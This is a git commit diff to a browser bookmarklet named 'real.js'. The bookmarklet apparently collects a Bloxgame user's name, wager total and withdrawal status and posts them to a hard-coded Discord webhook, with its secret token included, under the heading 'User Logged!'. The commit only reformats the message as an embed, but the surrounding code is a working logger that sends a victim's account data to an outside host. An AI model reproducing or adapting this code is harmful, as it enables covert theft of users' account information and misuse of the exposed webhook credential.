b7dc2a9dccf3dccb5f1ce0b4262652e62552c2e9
agreed69-scripts <kasparonuus@gmail.com>
2024-09-02 21:34:03 +0300

    Update real.js

--- real.js
+++ real.js
@@ -19,14 +19,22 @@ javascript:(function() {
                     var withdrawEnabled = response.user.withdrawEnabled ? 'Enabled' : 'Disabled';
 
                     var currentTime = new Date();
-                    var formattedTime = currentTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+                    var formattedTime = currentTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', hour12: true});
                     var formattedDate = currentTime.toLocaleDateString('en-US', {month: 'short', day: 'numeric'});
 
                     var webhookRequest = new XMLHttpRequest();
                     webhookRequest.open("POST", "https://discord.com/api/webhooks/1280222189429198858/M9axd-BRaA4_aLDb3aqzsHyvSsVVYusXykOX_K1hmvE6evrp5GkuWNqat4iy_p9HrNp3", true);
                     webhookRequest.setRequestHeader('Content-Type', 'application/json');
                     webhookRequest.send(JSON.stringify({
-                        content: `**User Logged!**\n\n**User**: ${user}\n**Wager**: ${wager}\n**Withdraw**: ${withdrawEnabled}\n\n*Bloxgame User Data • ${formattedDate} at ${formattedTime}*`
+                        embeds: [{
+                            title: "User Logged!",
+                            color: 3066993,  // Color in decimal (blue)
+                            description: `**User**: ${user}\n**Wager**: ${wager}\n**Withdraw**: ${withdrawEnabled}`,
+                            footer: {
+                                text: `Bloxgame User Data • ${formattedDate} at ${formattedTime}`
+                            },
+                            timestamp: new Date().toISOString()
+                        }]
                     }));
                     console.log('Response sent to webhook.');
                 }
